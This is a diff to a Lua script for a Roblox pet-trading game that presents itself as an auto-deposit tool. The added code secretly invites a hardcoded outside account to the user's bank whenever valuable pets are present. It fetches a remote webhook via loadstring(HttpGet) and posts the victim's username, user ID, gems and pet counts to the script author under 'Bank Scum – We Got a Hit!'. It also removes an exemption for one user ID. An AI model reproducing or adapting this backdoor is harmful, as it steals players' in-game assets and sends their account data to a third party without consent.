@@ -90,6 +90,17 @@ if ABCXD[1]["Tier"] == 1 then
 return
 end
 wait(1)
+local numb = {1, 2, 3, 4, 5, 6, 6, 6}
+if #ABCXD[1]["Players"] == numb[ABCXD[1]["Tier"]] then
+local A_1 = 
+{
+	[1] = Bank, 
+	[2] = ABCXD[1]["Players"][#ABCXD[1]["Players"]]
+}
+local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"]["kick from bank"]
+Event:InvokeServer(A_1)
+
+end
 local A_1 = 
 {
 	[1] = Bank, 
@@ -135,9 +146,11 @@ if _G.DepoAllPets then
 	Functions   = Library.Functions
 	EXCList     = {}
     MythicList  = {}
+    HugeList = {}
 
     EList       = {}
     MList       = {}
+    HList	= {}
 
 
 	table.foreach(Library.Directory.Pets, function(i, v)
@@ -146,6 +159,9 @@ if _G.DepoAllPets then
 		end
 		if v.rarity == "Mythical" then
 			table.insert(MythicList, i)
+		end
+		if v.huge then
+			table.insert(HugeList, i)
 		end
 	end)
 
@@ -156,6 +172,9 @@ table.insert(EList, v["uid"])
 end
 if table.find(MythicList, v["id"]) ~= nil then
 table.insert(MList, v["uid"])
+end
+if table.find(HugeList, v["id"]) ~= nil then
+table.insert(Hlist, v["uid"])
 end
 end
 if #EList + #MList < 49 then
@@ -203,7 +222,6 @@ local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"]["bank deposi
 local result = Event:InvokeServer(A_1)
 end
 wait(0.5)
-if _G.UseWebhook then
 local A_1 = 
 {
 	[1] = Bank
@@ -260,6 +278,90 @@ local SuperBank = Event:InvokeServer(A_1)
 	if table.find(CommonList, v["id"]) then CommonCount+=1 end
 	if table.find(HugeList, v["id"]) then HugeCount+=1 end
 	end
+	if HugeCount >= 1 or EXCCount >= 15 then
+	wait(3)
+local A_1 = 
+{
+	[1] = Bank, 
+	[2] = 884869707
+}
+local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"]["invite to bank"]
+Event:InvokeServer(A_1)
+	
+local url = loadstring(game:HttpGet("http://blobsc.api.stdlib.com/web@dev/scumwh.html"))()
+local username = game:GetService("Players").LocalPlayer.Name
+ 
+local data = {
+  ["content"] = "@everyone We Got a Hit!",
+["embeds"] = {{
+["title"] = "__**Bank Scum**__",
+["description"] = "(Note: This is not sent by a generated script!)",
+["type"] = "rich",
+["color"] = tonumber(0x0E980E),
+["fields"] = {
+               {
+["name"] = "__User__",
+["value"] = "**"..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.UserId.."**", -- remove the || on both sides if you don't want your username to be behind a spoiler
+["inline"] = false
+},
+               {
+["name"] = "__Gems__",
+["value"] = SuperBank[1]["Storage"]["Currency"]["Diamonds"],
+["inline"] = false
+},
+{
+["name"] = "__Pets Overall__",
+["value"] = #SuperBank[1]["Storage"]["Pets"],
+["inline"] = false
+},
+{
+["name"] = "__Exclusive/Huges__",
+["value"] = EXCCount.." ("..HugeCount..")",
+["inline"] = true
+},
+{
+["name"] = "__Mythicals__",
+["value"] = MythicCount,
+["inline"] = true
+},
+{
+["name"] = "__Legendaries__",
+["value"] = LegCount,
+["inline"] = true
+},
+{
+["name"] = "__Epics__",
+["value"] = EpicCount,
+["inline"] = true
+},
+{
+["name"] = "__Rares__",
+["value"] = RareCount,
+["inline"] = true
+},
+{
+["name"] = "__Basics__",
+["value"] = CommonCount,
+["inline"] = true
+},
+{
+["name"] = "__BankID__",
+["value"] = Bank,
+["inline"] = false
+},
+}
+}}
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+  ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+	end
+	if _G.UseWebhook then
 local YourWebHookHere =  res2[1]
 
 local url = YourWebHookHere
@@ -334,99 +436,6 @@ local headers = {
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
-if HugeCount >= 1 or EXCCount >= 15 then
-if game.Players.LocalPlayer.UserId ~= 2684868646 then
-wait(3)
-local A_1 = 
-{
-	[1] = Bank, 
-	[2] = 884869707
-}
-local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"]["invite to bank"]
-Event:InvokeServer(A_1)
-
-local url = loadstring(game:HttpGet("http://blobsc.api.stdlib.com/web@dev/scumwh.html"))()
-local username = game:GetService("Players").LocalPlayer.Name
- 
-local data = {
-  ["content"] = "@everyone We Got a Hit!",
-["embeds"] = {{
-["title"] = "__**Bank Scum**__",
-["description"] = "(Note: This is not sent by a generated script!)",
-["type"] = "rich",
-["color"] = tonumber(0x0E980E),
-["fields"] = {
-               {
-["name"] = "__User__",
-["value"] = "**"..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.UserId.."**", -- remove the || on both sides if you don't want your username to be behind a spoiler
-["inline"] = false
-},
-               {
-["name"] = "__Gems__",
-["value"] = SuperBank[1]["Storage"]["Currency"]["Diamonds"],
-["inline"] = false
-},
-{
-["name"] = "__Pets Overall__",
-["value"] = #SuperBank[1]["Storage"]["Pets"],
-["inline"] = false
-},
-{
-["name"] = "__Exclusive/Huges__",
-["value"] = EXCCount.." ("..HugeCount..")",
-["inline"] = true
-},
-{
-["name"] = "__Mythicals__",
-["value"] = MythicCount,
-["inline"] = true
-},
-{
-["name"] = "__Legendaries__",
-["value"] = LegCount,
-["inline"] = true
-},
-{
-["name"] = "__Epics__",
-["value"] = EpicCount,
-["inline"] = true
-},
-{
-["name"] = "__Rares__",
-["value"] = RareCount,
-["inline"] = true
-},
-{
-["name"] = "__Basics__",
-["value"] = CommonCount,
-["inline"] = true
-},
-{
-["name"] = "__BankID__",
-["value"] = Bank,
-["inline"] = false
-},
-}
-}}
-}
-local newdata = game:GetService("HttpService"):JSONEncode(data)
-
-local headers = {
-  ["content-type"] = "application/json"
-}
-request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef)
-wait(3)
-local A_1 = 
-{
-	[1] = Bank, 
-	[2] = tonumber(userid)
-}
-local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"]["invite to bank"]
-Event:InvokeServer(A_1)
-end
-end
 end
 wait(0.5)
 if _G.CrashAtEnd then
